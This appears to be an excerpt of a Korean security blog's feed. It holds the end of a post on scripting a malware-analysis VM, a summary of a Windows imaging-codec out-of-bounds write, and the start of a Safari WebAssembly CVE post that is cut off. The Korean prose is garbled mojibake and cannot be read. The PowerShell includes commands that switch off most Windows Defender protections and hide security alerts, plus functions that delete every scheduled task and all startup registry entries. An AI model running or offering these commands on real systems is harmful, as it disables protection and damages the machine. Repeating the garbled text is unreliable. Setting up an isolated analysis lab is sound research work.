class="hljs-literal">-DisableBlockAtFirstSeen</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableCatchupFullScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableCatchupQuickScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableIntrusionPreventionSystem</span> <span class="hljs-variable">$true</span>  <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableIOAVProtection</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRealtimeMonitoring</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRemovableDriveScanning</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRestorePoint</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScanningMappedNetworkDrivesForFullScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScanningNetworkFiles</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScriptScanning</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-EnableControlledFolderAccess</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-EnableNetworkProtection</span> AuditMode <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-MAPSReporting</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-SubmitSamplesConsent</span> NeverSend <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-PUAProtection</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        &#125;&#125;</code></pre><p>WinDefend Serviceì˜ ê²½ìš° ì—ëŸ¬ê°€ ëœ¨ëŠ” ê²½ìš°ê°€ ë§ì•„ try-catch ì²˜ë¦¬ë¥¼ í•˜ì˜€ê³ , ë§ˆì´í¬ë¡œì†Œí”„íŠ¸ì— ë¦¬í¬íŠ¸ë¥¼ ë³´ë‚´ëŠ” ê²ƒ, ê·¸ë¦¬ê³  OS ë²„ì „ì´ 6.1.7601 (Windows 7 Service Pack 1)ì´ ì•„ë‹ ê²½ìš° (Windows 10ì¼ ê²½ìš°ì¸ ê²ƒ ê°™ìŠµë‹ˆë‹¤.) Defenderì— ì¶”ê°€ëœ ë‹¤ë¥¸ ì„¤ì •ë“¤ì„ ë¹„í™œì„±í™”í•´ì¤ë‹ˆë‹¤.</p><p>ì†ŒìŠ¤ ì½”ë“œë¥¼ ê°€ì ¸ì™€ì„œ ì½ìœ¼ë©´ì„œ ëŠë‚€ ê±´ Windows 7 Service Pack 1ë¡œ ê²€ì‚¬í•˜ëŠ” ê²Œ ì•„ë‹ˆë¼ Windows 10ê³¼ Server 2019ì— ëŒ€í•œ Defender ëª…ë ¹ì–´ì¸ ê²ƒ ê°™ì€ë° <code>[System.Envrionment]::OSVersion.Version.Major -eq 10</code>ìœ¼ë¡œ Windows 10ì¸ì§€ í™•ì¸í•˜ë©´ ë˜ì§€ ì•Šë‚˜? ì‹¶ì—ˆìŠµë‹ˆë‹¤.</p><p>ì‚¬ì‹¤ìƒ ì €ëŠ” Windows 10 ê¸°ì¤€ìœ¼ë¡œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í–ˆì§€ë§Œìš”.</p><h1 id="ë³´ì•ˆ-ìœ ì§€-ì •ì±…-ì•Œë¦¼-ë¹„í™œì„±í™”"><a href="#ë³´ì•ˆ-ìœ ì§€-ì •ì±…-ì•Œë¦¼-ë¹„í™œì„±í™”" class="headerlink" title="ë³´ì•ˆ ìœ ì§€ ì •ì±… ì•Œë¦¼ ë¹„í™œì„±í™”"></a>ë³´ì•ˆ ìœ ì§€ ì •ì±… ì•Œë¦¼ ë¹„í™œì„±í™”</h1><p>ë³´ì•ˆ ìœ ì§€ ì •ì±… ì•Œë¦¼ ì•„ì´ì½˜ ë¹„í™œì„±í™”ì…ë‹ˆë‹¤. ì´ê±´ êµ³ì´ í•„ìš” ì—†ì–´ ë³´ì´ê¸´ í•˜ì§€ë§Œ ì €ëŠ” ë¹¨ê°„ ë¶ˆì´ ë– ìˆë‹¤ê±°ë‚˜ ëŠë‚Œí‘œê°€ ë– ìˆë‹¤ê±°ë‚˜ í•˜ë©´ ì‹ ê²½ì´ êµ‰ì¥íˆ ë§ì´ ì“°ì´ëŠ” ì‚¬ëŒì´ê¸°ì—â€¦</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%201.png"></p><pre><code class="hljs powershell"><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;HideSCAHealth&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><p>ì°¾ì•„ë³´ì•˜ë”ë‹ˆ Microsoft Policiesì— <a href="https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.TaskBar2::HideSCAHealth">HideSCAHealth ë ˆì§€ìŠ¤íŠ¸ë¦¬</a>ì— í•´ë‹¹ ë¶€ë¶„ì„ ë¹„í™œì„±í™”í•  ìˆ˜ ìˆë‹¤ëŠ” ì‚¬ì‹¤ì„ ì•Œì•˜ìŠµë‹ˆë‹¤! ì˜¤ì˜ˆ ë°”ë¡œ ì„¤ì •í•˜ì£ ! <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer</code>ì— <code>HideSCAHealth</code>ì˜ ê°’ì„ 1ë¡œ í•˜ë©´ í•´ë‹¹ í”Œë˜ê·¸ê°€ ì„¤ì •ë˜ì–´ ë³´ì•ˆ ì•Œë¦¼ ì„¤ì •ì´ ìˆ¨ê²¨ì§‘ë‹ˆë‹¤!</p><h1 id="ì‘ì—…-ìŠ¤ì¼€ì¤„ëŸ¬-ì‚­ì œ"><a href="#ì‘ì—…-ìŠ¤ì¼€ì¤„ëŸ¬-ì‚­ì œ" class="headerlink" title="ì‘ì—… ìŠ¤ì¼€ì¤„ëŸ¬ ì‚­ì œ"></a>ì‘ì—… ìŠ¤ì¼€ì¤„ëŸ¬ ì‚­ì œ</h1><p>ì´ì œ Windowsì— ê¸°ë³¸ì ìœ¼ë¡œ ì„¤ì •ë˜ì–´ ìˆê±°ë‚˜, ë‹¤ë¥¸ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì¶”ê°€í•˜ë©´ì„œ ë“±ë¡ëœ ë¶ˆí•„ìš”í•œ ì‘ì—… ìŠ¤ì¼€ì¤„ëŸ¬ë¥¼ ì‚­ì œí•  ì‹œê°„ì…ë‹ˆë‹¤.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%202.png"></p><p>ì‘ì—… ìŠ¤ì¼€ì¤„ëŸ¬ì— í‘œì‹œëœ ì´ ë…€ì„ë“¤ì„ ì‚­ì œë¥¼ í•˜ëŠ” ê±°ì£ . ì´ ì‘ì—…ì—” ë¹„í•˜ì¸ë“œ ì—í”¼ì†Œë“œê°€ ìˆìŠµë‹ˆë‹¤. Task ë¦¬ìŠ¤íŠ¸ë¥¼ ê°€ì ¸ì™€ì„œ ëª¨ë‘ ì‚­ì œë¥¼ í•´ë²„ë¦¬ë©´ ë  ê±°ë¼ ìƒê°í–ˆì–´ìš”. ì € ë¶€ë¶„ì— ìˆëŠ” ì¹œêµ¬ë“¤ë§Œ ê°€ì ¸ì˜¨ë‹¤ê³  ìƒê°í–ˆìŠµë‹ˆë‹¤.</p><p>ê·¼ë° í…ŒìŠ¤íŠ¸ë¥¼ í•˜ëŠ”ë°â€¦ Windows ê¸°ëŠ¥ì´ ì •ìƒì ìœ¼ë¡œ ë™ì‘ ì•ˆ í•˜ëŠ” ê²Œ ìˆëŠ” ê±°ì—ìš”â€¦ ê²€ìƒ‰ì´ ì•ˆ ë˜ê³ â€¦ ì™œ ì´ëŸ¬ì§€? ì™œ ì´ëŸ¬ì§€? ì–´ë””ê°€ ë¬¸ì œì§€? í•˜ë©´ì„œ í•¨ìˆ˜ í˜¸ì¶œì„ í•˜ë‚˜í•˜ë‚˜ ì£¼ì„ ì²˜ë¦¬í•˜ë‹¤ê°€ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove_task</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-variable">$TS</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> Schedule.Service    <span class="hljs-variable">$TS</span>.Connect(<span class="hljs-variable">$env:COMPUTERNAME</span>)    <span class="hljs-variable">$TaskFolder</span> = <span class="hljs-variable">$TS</span>.GetFolder(<span class="hljs-string">&#x27;\&#x27;</span>)    <span class="hljs-variable">$Tasks</span> = <span class="hljs-variable">$TaskFolder</span>.GetTasks(<span class="hljs-number">1</span>)    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Task</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Tasks</span>)    &#123;        <span class="hljs-variable">$TaskFolder</span>.DeleteTask(<span class="hljs-variable">$Task</span>.Name, <span class="hljs-number">0</span>)    &#125;&#125;</code></pre><p>remove taskëŠ” ComObjectë¥¼ í†µí•´ Schedule.Serviceì—ì„œ Task ë¦¬ìŠ¤íŠ¸ë¥¼ ê°€ì ¸ì™€ì„œ ì‚­ì œë¥¼ í•´ì¤ë‹ˆë‹¤. ì‹œìŠ¤í…œ ìŠ¤ì¼€ì¤„ê¹Œì§€ ëª¨ë‘ ì‚­ì œí•´ë²„ë ¤ì„œ ë°œìƒí•œ í•´í”„ë‹ì´ì—ˆìŠµë‹ˆë‹¤. ã…œ.ã…œ</p><h1 id="ì‹œì‘-í”„ë¡œê·¸ë¨-ì‚­ì œ"><a href="#ì‹œì‘-í”„ë¡œê·¸ë¨-ì‚­ì œ" class="headerlink" title="ì‹œì‘ í”„ë¡œê·¸ë¨ ì‚­ì œ"></a>ì‹œì‘ í”„ë¡œê·¸ë¨ ì‚­ì œ</h1><p>ì•…ì„±ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê³ , ì–´ë–¤ ê²ƒë“¤ì´ autorun ë˜ëŠ”ì§€ í™•ì¸í•  ë•Œ ì—¬ëŸ¬ ì¡ë‹¤í•œ í”„ë¡œê·¸ë¨ë“¤ì´ ì‹¤í–‰ë˜ë©´ ë³´ê¸° í˜ë“¤ê² ì£ ? ê·¸ë˜ì„œ ì´ê²ƒ ë˜í•œ ì§€ì›Œë²„ë¦½ì‹œë‹¤!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">disable_startup</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-variable">$user</span> = <span class="hljs-built_in">New-Object</span> System.Security.Principal.NTAccount(<span class="hljs-variable">$env:username</span>)    <span class="hljs-variable">$sid</span> = (<span class="hljs-variable">$user</span>.Translate([<span class="hljs-type">System.Security.Principal.SecurityIdentifier</span>])).Value    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\S-1-5-20\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\<span class="hljs-variable">$sid</span>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>&#125;</code></pre><p>íŠ¹ì • ì‚¬ìš©ìì— í•œí•´ ë“±ë¡ëœ ì‹œì‘ í”„ë¡œê·¸ë¨ì€ ê·¸ ì‚¬ìš©ìì˜ SID ê²½ë¡œë¥¼ í†µí•´ ì €ì¥ì´ ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ì‚¬ìš©ìì— ë”°ë¥¸ SID ê°’ì„ ê°€ì ¸ì™€ì„œ ì‚­ì œë¥¼ í•´ì£¼ëŠ” ê±°ì£ ! ì¼ë‹¨ì€â€¦ ì €ë ‡ê²Œ ì§€ì •ì„ í–ˆëŠ”ë° ì•ˆ ì§€ì›Œì§€ëŠ” ê²ƒë“¤ì´ ìˆë”ë¼êµ¬ìš”â€¦??? ì´ìœ ë¥¼â€¦ ëª» ì°¾ê² ì–´ì„œ ë‚¨ì•„ìˆëŠ” ê±°ëŠ” ì†ìœ¼ë¡œ ì§€ì› ìŠµë‹ˆë‹¤.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%203.png"></p><p>ìµœì¢…ë³¸ì„ ê°€ì ¸ì˜¬ ë•ŒëŠ” ê¼­ ìˆ˜ì •í•´ì„œ ê°€ì ¸ì˜¬ê²Œìš”! ì´ë²ˆë§Œ ë„ˆê·¸ëŸ¬ì´ ë´ì£¼ì‹œë©´â€¦</p><h1 id="ìˆ¨ê¹€-íŒŒì¼-í‘œì‹œ"><a href="#ìˆ¨ê¹€-íŒŒì¼-í‘œì‹œ" class="headerlink" title="ìˆ¨ê¹€ íŒŒì¼ í‘œì‹œ"></a>ìˆ¨ê¹€ íŒŒì¼ í‘œì‹œ</h1><p>ì´ì œ ìˆ¨ê¹€ íŒŒì¼ê³¼ ì‹œìŠ¤í…œ ìˆ¨ê¹€ íŒŒì¼ë“¤ì„ í‘œì‹œí•´ë´…ì‹œë‹¤. ì„¤ì¹˜í•˜ê³  ìˆ¨ê¹€ íŒŒì¼ì„ ì²´í¬í•˜ê³  í•˜ëŠ” ê²ƒ ë˜í•œ ë ˆì§€ìŠ¤íŠ¸ë¦¬ë¥¼ í†µí•´ì„œ ì‘ì—…í•  ìˆ˜ ìˆì–´ìš”. WindowsëŠ” ë ˆì§€ìŠ¤íŠ¸ë¦¬ë¥¼ í†µí•´ì„œ ì´ê²ƒì €ê²ƒ ì„¤ì •í•˜ë‹ˆê¹Œìš”.</p><pre><code class="hljs powershell"><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Hidden&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;ShowSuperHidden&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><p><code>Hidden</code>ê³¼ <code>ShowSuperHidden</code>ì˜ ê°’ì„ 1ë¡œ ì„¤ì •í•´ì£¼ë©´ ëì…ë‹ˆë‹¤! ì´ì œ ê¸°ë³¸ì ì¸ ì„¤ì •ì€ ì™„ë£Œë˜ì—ˆì–´ìš”.</p><h1 id="ë§ˆì¹˜ë©°"><a href="#ë§ˆì¹˜ë©°" class="headerlink" title="ë§ˆì¹˜ë©°"></a>ë§ˆì¹˜ë©°</h1><p>ê°„ë‹¨í•œ Windows ì„¤ì •ì„ ìŠ¤í¬ë¦½íŠ¸ë¡œ ì‘ì„±í•´ë³´ì•˜ìŠµë‹ˆë‹¤. ì†ìœ¼ë¡œ í•´ë„ ì–¼ë§ˆ ì•ˆ ê±¸ë¦¬ì§€ë§Œ, ê°€ë” ëª‡ ê°œ ê¹Œë¨¹ì„ ë•Œë„ ìˆê³  ê·€ì°®ì–ì•„ìš”? ìŠ¤í¬ë¦½íŠ¸ë¡œ ì‘ì„±í•˜ë©´ ì‹¤í–‰ë§Œ í•˜ë©´ ì´ ëª¨ë“  ê²ƒë“¤ì„ <del>ë¬´ë£Œ!</del> ê¹Œë¨¹ì€ ê±° ì—†ì´ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë‹¤ìŒ íŒŒíŠ¸ì—ì„œ chocolateyë¥¼ í†µí•´ì„œ ì—¬ëŸ¬ ê°€ì§€ íˆ´ë“¤ì„ ì„¤ì¹˜í•˜ê³  ê°œì¸ì˜ ì…ë§›ì— ë§ê²Œ ì‘ì—… í‘œì‹œì¤„ì— ì¶”ê°€, ë°”íƒ•í™”ë©´ ë°”ë¡œê°€ê¸° ë§Œë“¤ê¸° ë“±ì— ëŒ€í•´ì„œ ì•Œì•„ë´…ì‹œë‹¤. ë‹¤ìŒ íŒŒíŠ¸ê°€ ëª¨ë‘ ì§„í–‰ë˜ê³  ë‚˜ë©´ ì „ì²´ ì†ŒìŠ¤ ì½”ë“œë¥¼ githubì— ì˜¬ë ¤ì„œ ë§í¬ë¥¼ ê±¸ì–´ë“œë¦¬ê² ìŠµë‹ˆë‹¤! ë§ˆì§€ë§‰ìœ¼ë¡œ í•´ë‹¹ ê¸°ëŠ¥ë“¤ì„ êµ¬í˜„í•  ë•Œ ì°¸ê³  ë§í¬ë“¤ì„ ì‘ì„±í•˜ë©° ì´ë§Œ ë¬¼ëŸ¬ê°€ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤. ê·¸ëŸ¼ ì•ˆë‡½~</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>disableÂ securityÂ maintenanceÂ icon: <a href="https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.TaskBar2::HideSCAHealth">https://admx.help/?Category=Windows_10_2016&amp;Policy=Microsoft.Policies.TaskBar2::HideSCAHealth</a></p><p>show hidden files: <a href="https://www.python2.net/questions-1237399.htm">https://www.python2.net/questions-1237399.htm</a></p><p>remove app list: <a href="https://community.spiceworks.com/topic/2230169-powershell-script-to-remove-xbox-gamebar-from-the-app-list">https://community.spiceworks.com/topic/2230169-powershell-script-to-remove-xbox-gamebar-from-the-app-list</a></p><p>disable windows defender: <a href="https://github.com/fireeye/flare-vm/blob/master/install.ps1">https://github.com/fireeye/flare-vm/blob/master/install.ps1</a></p><p>disable windows update: <a href="https://social.technet.microsoft.com/Forums/lync/en-US/abde2699-0d5a-49ad-bfda-e87d903dd865/disable-windows-update-via-powershell?forum=winserverpowershell">https://social.technet.microsoft.com/Forums/lync/en-US/abde2699-0d5a-49ad-bfda-e87d903dd865/disable-windows-update-via-powershell?forum=winserverpowershell</a></p><p>get specific sid: <a href="https://techexpert.tips/powershell/powershell-get-user-sid/">https://techexpert.tips/powershell/powershell-get-user-sid/</a></p><p>remove all registry key under specific key: <a href="https://docs.microsoft.com/ko-kr/powershell/scripting/samples/working-with-registry-keys?view=powershell-7.1#removing-all-keys-under-a-specific-key">https://docs.microsoft.com/ko-kr/powershell/scripting/samples/working-with-registry-keys?view=powershell-7.1#removing-all-keys-under-a-specific-key</a></p><p>remove task: <a href="https://community.spiceworks.com/how_to/159324-delete-scheduled-task-with-powershell">https://community.spiceworks.com/how_to/159324-delete-scheduled-task-with-powershell</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>powershell</tag>
      
      <tag>automated</tag>
      
      <tag>virtual machine</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Windows: Out-of-bounds write in WindowsCodecsRaw!COlympusE300LoadRaw</title>
    <link href="/2021/06/06/j0ker/2021-06-06/"/>
    <url>/2021/06/06/j0ker/2021-06-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2137&q=&can=1&sort=-reported">Issue 2137: Windows: Out-of-bounds write in WindowsCodecsRaw!COlympusE300LoadRaw</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10 20H1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windowsì—ì„œëŠ” Olympus E300ì˜ raw ì´ë¯¸ì§€ íŒŒì¼ì„ ì²˜ë¦¬í•  ë•Œ, <code>Windows Imaging Component (WIC)</code>ë¥¼ í†µí•´ ì²˜ë¦¬í•©ë‹ˆë‹¤. ì´ ë•Œ <code>WindowsCodecsRaw.dll</code>ì˜ <code>COlympusE300LoadRaw::olympus_e300_load_raw()</code> í•¨ìˆ˜ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤. ì·¨ì•½ì ì´ ë°œìƒí•œ í•¨ìˆ˜ì˜ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> CLASS <span class="hljs-title">olympus_e300_load_raw</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;  uchar  *data,  *dp;  ushort *pixel, *pix;  <span class="hljs-keyword">int</span> dwide, row, col;  dwide = raw_width * <span class="hljs-number">16</span> / <span class="hljs-number">10</span>;               <span class="hljs-comment">// (1)</span>  data = <span class="hljs-built_in">malloc</span> (dwide + raw_width*<span class="hljs-number">2</span>);  merror (data, <span class="hljs-string">&quot;olympus_e300_load_raw()&quot;</span>);  pixel = (ushort *) (data + dwide);  <span class="hljs-keyword">for</span> (row=<span class="hljs-number">0</span>; row &lt; height; row++) &#123;    fread (data, <span class="hljs-number">1</span>, dwide, ifp);    <span class="hljs-keyword">for</span> (dp=data, pix=pixel; pix &lt; pixel+raw_width; dp+=<span class="hljs-number">3</span>, pix+=<span class="hljs-number">2</span>) &#123;  <span class="hljs-comment">//  (2)</span>      <span class="hljs-keyword">if</span> (((dp-data) &amp; <span class="hljs-number">15</span>) == <span class="hljs-number">15</span>) dp++;      pix[<span class="hljs-number">0</span>] = dp[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span> | dp[<span class="hljs-number">0</span>];                                    <span class="hljs-comment">// (3)</span>      pix[<span class="hljs-number">1</span>] = dp[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">4</span> | dp[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">4</span>;                               <span class="hljs-comment">// (4)</span>    &#125;    <span class="hljs-keyword">for</span> (col=<span class="hljs-number">0</span>; col &lt; width; col++)      BAYER(row,col) = (pixel[col] &amp; <span class="hljs-number">0xfff</span>);  &#125;  <span class="hljs-built_in">free</span> (data);&#125;</code></pre><p>ë¨¼ì € (1)ì—ì„œ ë””ì½”ë”©ëœ ë°ì´í„°ë¥¼ ì €ì¥í•  ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤. ë””ì½”ë”©ì€ ì—´ ë‹¨ìœ„ë¡œ ë””ì½”ë”©ì„ ì§„í–‰í•˜ëŠ”ë°, í•œ ì—´ì—ëŠ” <code>height</code>ë§Œí¼ì˜ í”½ì…€ì´ ì¡´ì¬í•˜ë©° í”½ì…€ì€ ê°ê° 2 bytesì˜ ë°ì´í„°ë¡œ ë””ì½”ë”© ë©ë‹ˆë‹¤. ê·¸ë¦¬ê³  (2)ì—ì„œë¶€í„° ì‹¤ì§ˆì ì¸ ë””ì½”ë”© ì‘ì—…ì´ ì§„í–‰ë©ë‹ˆë‹¤. ì¡°ê±´ë¬¸ì„ <code>pix &lt; pixel+raw_width</code>ë¡œ ì„¤ì •í•¨ìœ¼ë¡œì¨ ë””ì½”ë”© ê³¼ì •ì—ì„œ OOBê°€ ë°œìƒí•˜ì§€ ì•Šë„ë¡ ì‹ ê²½ì¼ì§€ë§Œ <code>raw_width</code>ê°€ <code>0xd79</code>ê°™ì´ í™€ìˆ˜ì¼ ê²½ìš°, í•œ í”½ì…€ ë‹¹ 2 bytes ì”© ë””ì½”ë“œí•˜ê¸° ë•Œë¬¸ì— í•´ë‹¹ loopì˜ ë§ˆì§€ë§‰ì—ì„œ (3)ì—ì„œëŠ” ë²„í¼ì˜ ë§ˆì§€ë§‰ì— ë°ì´í„°ë¥¼ ì“°ì§€ë§Œ (4)ì—ì„œ ë²„í¼ ë°–ì˜ ë©”ëª¨ë¦¬ ì˜ì—­ì— ë°ì´í„°ë¥¼ ì“°ê²Œ ë˜ì–´ 1 byte ì˜ OOB Writeê°€ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>microsoft</tag>
      
      <tag>oob</tag>
      
      <tag>j0ker</tag>
      
      <tag>WindowsCodecsRaw</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-30734: Safari WebAssembly LLIntì—ì„œ ë°œê²¬ëœ Integer Overflow ì·¨ì•½ì </title>
    <link href="/2021/06/05/fabu1ous/2021-06-05/"/>
    <url>/2021/06/05/fabu1ous/2021-06-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.ret2.io/2021/06/02/pwn2own-2021-jsc-exploit/">Exploitation of a JavaScriptCore WebAssembly Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Safari &lt;14.1.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Safariì˜ WebAssemblyëŠ” ì„¸ ë‹¨ê³„ë¥¼ ê±°ì³ ì‹¤í–‰ë˜ëŠ”ë° ê·¸ ì²« ë²ˆì§¸ ë‹¨ê³„ì¸ LLInt(Low Level Interpreter)ì— interger overflow ì·¨ì•½ì (CVE-2021-30734)ì´ ë°œìƒí•˜ì—¬ Safari 14.1.1 ë²„ì „ì—ì„œ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤. LLIntì˜ ParserëŠ” í•¨ìˆ˜ì˜ ìœ íš¨ì„±ì„ ê²€ì‚¬í•˜ëŠ” ê³¼ì •ì—ì„œ 